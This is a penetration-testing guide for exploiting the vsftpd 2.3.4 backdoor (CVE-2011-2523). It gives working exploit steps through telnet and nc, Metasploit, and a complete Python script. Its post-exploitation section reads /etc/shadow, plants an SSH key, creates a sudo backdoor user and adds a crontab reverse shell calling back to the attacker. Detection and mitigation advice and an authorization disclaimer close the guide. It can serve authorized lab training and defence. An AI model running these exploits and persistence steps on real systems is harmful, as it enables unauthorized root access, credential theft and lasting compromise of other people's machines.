# 🔐 FTP (Port 21) - vsftpd 2.3.4 Exploitation Guide

## 🎯 Vulnerability Overview

**Service:** vsftpd (Very Secure FTP Daemon)  
**Version:** 2.3.4  
**CVE:** CVE-2011-2523  
**Vulnerability Type:** Backdoor/Remote Code Execution  
**Severity:** Critical (CVSS 10.0)

### Description
vsftpd 2.3.4 contains a malicious backdoor that was introduced through a compromised source code download. The backdoor is triggered when a username containing the string `:)` is used during authentication. Once triggered, the backdoor opens a shell on port 6200.

---

## 🔍 Reconnaissance Workflow

### Step 1: Service Detection

#### Basic Port Scan
```bash
# Quick port scan
nmap -p 21 <target-ip>

# Service version detection
nmap -sV -p 21 <target-ip>

# Comprehensive FTP enumeration
nmap -sV -sC -p 21 --script ftp-* <target-ip>
```

**Expected Output:**
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
```

#### Banner Grabbing
```bash
# Manual banner grabbing
nc <target-ip> 21

# Using telnet
telnet <target-ip> 21

# Expected banner
# 220 (vsFTPd 2.3.4)
```

### Step 2: FTP Service Enumeration

#### Anonymous Access Test
```bash
# Test anonymous FTP access
ftp <target-ip>
# Username: anonymous
# Password: anonymous (or any email)

# Alternative using lftp
lftp ftp://anonymous:anonymous@<target-ip>
```

#### FTP Commands Testing
```bash
# Connect and test basic commands
ftp <target-ip>
# After connecting:
ls
pwd
dir
binary
ascii
passive
```

---

## 💥 Exploitation Workflow

### Method 1: Manual Backdoor Exploitation

#### Step 1: Trigger the Backdoor
```bash
# Connect to FTP service
telnet <target-ip> 21

# Wait for banner: 220 (vsFTPd 2.3.4)
# Send malicious username (the :) triggers the backdoor)
USER malicious:)

# Send any password
PASS anything

# The connection may hang or close - this is normal
```

#### Step 2: Connect to Backdoor Shell
```bash
# In a new terminal, connect to the backdoor on port 6200
nc <target-ip> 6200

# You should get a root shell immediately
# Verify with:
id
whoami
```

#### Step 3: Shell Stabilization
```bash
# Upgrade to interactive shell
python -c "import pty;pty.spawn('/bin/bash')"

# Set terminal type
export TERM=xterm

# Background the process and set proper terminal handling
# Ctrl+Z
stty raw -echo; fg
# Press Enter twice
```

### Method 2: Metasploit Exploitation

#### Step 1: Configure Metasploit
```bash
# Start Metasploit console
msfconsole

# Use the vsftpd backdoor exploit
use exploit/unix/ftp/vsftpd_234_backdoor

# Show exploit options
show options

# Set required parameters
set RHOSTS <target-ip>
set LHOST <your-ip>

# Optional: set specific payload
set PAYLOAD cmd/unix/interact
```

#### Step 2: Execute Exploit
```bash
# Check if target is exploitable
check

# Execute the exploit
exploit

# Alternative: run the exploit
run
```

### Method 3: Python Script Exploitation

```python
#!/usr/bin/env python3
import socket
import sys
import time

def exploit_vsftpd(target_ip):
    try:
        # Connect to FTP service
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, 21))
        
        # Receive banner
        banner = s.recv(1024)
        print(f"Banner: {banner.decode().strip()}")
        
        # Send malicious username
        s.send(b"USER malicious:)\r\n")
        response = s.recv(1024)
        print(f"USER response: {response.decode().strip()}")
        
        # Send password
        s.send(b"PASS anything\r\n")
        s.close()
        
        print("Backdoor triggered. Attempting to connect to port 6200...")
        time.sleep(2)
        
        # Connect to backdoor
        backdoor = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        backdoor.connect((target_ip, 6200))
        
        # Send command to verify access
        backdoor.send(b"id\n")
        result = backdoor.recv(1024)
        print(f"Command output: {result.decode()}")
        
        # Interactive shell
        import subprocess
        subprocess.call(f"nc {target_ip} 6200", shell=True)
        
    except Exception as e:
        print(f"Exploitation failed: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 vsftpd_exploit.py <target-ip>")
        sys.exit(1)
    
    target = sys.argv[1]
    exploit_vsftpd(target)
```

---

## ✅ Post-Exploitation Activities

### Initial System Reconnaissance
```bash
# Verify privileges
id
whoami
groups

# System information
uname -a
cat /etc/*release*
hostname

# Network configuration
ifconfig -a
ip addr show
netstat -tulpn

# Running processes
ps aux | head -20
ps -ef | grep root
```

### Privilege Escalation Check
```bash
# Check if already root (usually the case with this exploit)
id

# If not root, check sudo permissions
sudo -l

# Look for SUID binaries
find / -perm -4000 2>/dev/null

# Check for interesting files
find /home -type f -name "*.txt" -o -name "*.bak" 2>/dev/null
```

### Data Exfiltration
```bash
# Look for sensitive files
cat /etc/passwd
cat /etc/shadow
find / -name "*.conf" 2>/dev/null | head -10

# Check user directories
ls -la /home/
ls -la /root/

# Database files
find / -name "*.db" -o -name "*.sql" 2>/dev/null
```

### Persistence Establishment
```bash
# Add SSH key (if SSH is available)
mkdir -p /root/.ssh
echo "<your-public-key>" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# Create backdoor user
useradd -m -s /bin/bash backdoor
echo "backdoor:password123" | chpasswd
usermod -aG sudo backdoor

# Cron job persistence
echo "* * * * * root nc <your-ip> <your-port> -e /bin/bash" >> /etc/crontab
```

---

## 🛠️ Troubleshooting

### Common Issues and Solutions

#### Issue 1: Backdoor doesn't trigger
```bash
# Verify the exact version
nc <target-ip> 21
# Must show: 220 (vsFTPd 2.3.4)

# Try different username formats
USER user:)
USER admin:)
USER test:)
```

#### Issue 2: Port 6200 connection refused
```bash
# Check if port is actually open after triggering
nmap -p 6200 <target-ip>

# Try connecting multiple times
nc <target-ip> 6200
# Wait a few seconds and try again
```

#### Issue 3: Shell is unstable
```bash
# Use different shell stabilization methods
python -c "import pty;pty.spawn('/bin/bash')"
# or
script /dev/null -c bash
# or
exec bash -i
```

---

## 🔍 Detection and Mitigation

### Detection Methods
```bash
# Network-based detection
# Monitor for connections to port 6200
netstat -tulpn | grep 6200

# Log analysis
grep ":)" /var/log/vsftpd.log
grep "6200" /var/log/auth.log

# Process monitoring
ps aux | grep vsftpd
lsof -i :6200
```

### Mitigation Strategies
1. **Immediate Actions:**
   - Upgrade vsftpd to latest version (3.x+)
   - Block port 6200 at firewall level
   - Disable FTP if not required

2. **Long-term Security:**
   - Implement network segmentation
   - Use SFTP instead of FTP
   - Regular security updates
   - Network monitoring

### Patch Information
```bash
# Check current version
vsftpd -version

# Ubuntu/Debian upgrade
apt update && apt upgrade vsftpd

# CentOS/RHEL upgrade
yum update vsftpd
```

---

## 📚 References and Resources

- **CVE-2011-2523:** https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523
- **Exploit-DB:** https://www.exploit-db.com/exploits/17491
- **Metasploit Module:** exploit/unix/ftp/vsftpd_234_backdoor
- **NIST NVD:** https://nvd.nist.gov/vuln/detail/CVE-2011-2523

---

## ⚠️ Legal and Ethical Considerations

**WARNING:** This guide is for educational and authorized penetration testing purposes only.

- Always obtain proper written authorization before testing
- Only use against systems you own or have explicit permission to test
- Document all activities for reporting purposes
- Follow responsible disclosure practices
- Comply with local laws and regulations

---

*Last Updated: August 2025*  
*Version: 1.0*